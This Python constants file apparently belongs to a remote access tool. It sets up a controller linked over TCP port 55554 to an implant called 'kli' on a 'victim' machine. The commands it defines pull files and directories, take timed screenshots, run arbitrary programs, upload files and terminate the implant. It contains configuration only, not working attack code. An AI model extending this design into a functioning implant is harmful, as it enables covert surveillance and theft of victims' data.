
class ConnectionConstants(object):
    TCP_PORT = 55554
    CONNECTION_FAILED_MSG = "Connection attempt to victim '{}' failed.. "
    SOCKET_TIMEOUT_LENGTH = None #5 # seconds
    CONNECTION_SUCCESS_MSG = "Connected to kli on ip: {}"
    KLI_NOT_RESPONDING_WARNING_MSG = "Kli not responding.. "

class HQConstants(object):
    RELATIVE_PRODUCTS_DIR = r"Products\stuff_[{hostname}@{ip}]"

class SocketHandlerConstants(object):
    HANDLER_INITIATE_ERROR_MSG = "SocketHandler argument requirements not satisfied"
    CLIENT_KEY = "client"
    SERVER_KEY = "server"
    TCP_PORT_KEY = "tcp_port"
    HOSTNAME_KEY = "connect_to"
    SOCKET_TIMEOUT_KEY = "socket_timeout"

class DataTransmissionConstants(object):
    RECV_BUFFER_SIZE = 100
    MAX_SENT_DATA_SIZE = 2048
    ACK = "ACK"
    BASE64 = "base64"
    UNKNOWN_COMMAND_RESPONSE_ERROR_MSG = "Unknown command response received.. "

class CommandConstants(object):
    INVALID_COMMAND_RESPONSE_INDICATOR = "invalid"
    INVALID_COMMAND_SIZE_INDICATOR = 150 # approximately, the reasonable max size of an invalid message

    GETFILE_COMMAND_INDICATOR = "getfile"
    GETFILE_COMPLETE_MSG = "File '{}' got home safe and sound!"
    GETFILE_FILE_PATH_INVALID_MSG = "File path invalid: '{}'"

    GETDIR_COMMAND_INDICATOR = "getdir"
    GETDIR_DIR_PATH_INVALID_MSG = "Dir path invalid: '{}'"
    GETDIR_POSITIVE_CONFIRMATION = "y"
    GETDIR_NEGATIVE_CONFIRMATION = "n"
    GETDIR_CONFIRMATION_MSG = "Total size of files in dir is: {} Kb. Continue? " + \
                              "({0}\{1})  ".format(GETDIR_POSITIVE_CONFIRMATION, GETDIR_NEGATIVE_CONFIRMATION)


    SCREENSHOT_COMMAND_INDICATOR = "screenshot"
    SCREENSHOT_VALID_ARGS_COUNT = [0, 2]
    SCREENSHOT_INVALID_ARGS_ERROR_MSG = "Screenshot command arguments invalid..\nUsage: screenshot <<optional: <number of screenshots> <time between screenshots in ms> >>"
    SCREENSHOTS_DIR_NAME = "screenshots"
    SCREENSHOT_TEMP_PATH = "shot_{}.jpg"
    SCREENSHOT_COMPLETE_MSG = "Screenshot got home safe and sound!"

    RUN_COMMAND_INDICATOR = "run:"
    RUN_COMMAND_INVALID = "Command invalid: '{}'. failed to run.. "
    RUN_COMMAND_SUCCESSFUL_MSG = "command '{0}' ran successfully! process id: {1}\n"

    KILL_KLI_COMMAND_INDICATOR = "exit"
    KILLED_KLI_MSG = "Kli killed!"

    UPLOAD_FILE_COMMAND_INDICATOR = "upload"
    UPLOAD_FILE_COMMAND_PARSER_REGEX = "{upload_command} ([A-Z]:\\\.*) ([A-Z]:\\\.*)".format(upload_command=UPLOAD_FILE_COMMAND_INDICATOR)
    UPLOAD_FILE_INVALID_ARGS_ERROR_MSG = "Invalid upload command args..\nUsage: upload <file_to_send_full_path> <dir_in_yaad_to_save_full_path>"
    UPLOAD_FILE_DOESNT_EXIST_MSG = "The file to send '{}' doesn't exist.. "
    UPLOAD_FILE_SEND_FAILED_MSG = "Failed to send file '{}' to dst"
    UPLOAD_FILE_FAILED_TO_SAVE_FILE = "Failed to save file in '{0}'..\nError: '{1}'"
    UPLOAD_FILE_FINISHED_SUCCESSFULLY = "File was uploaded successfully to: '{}'"
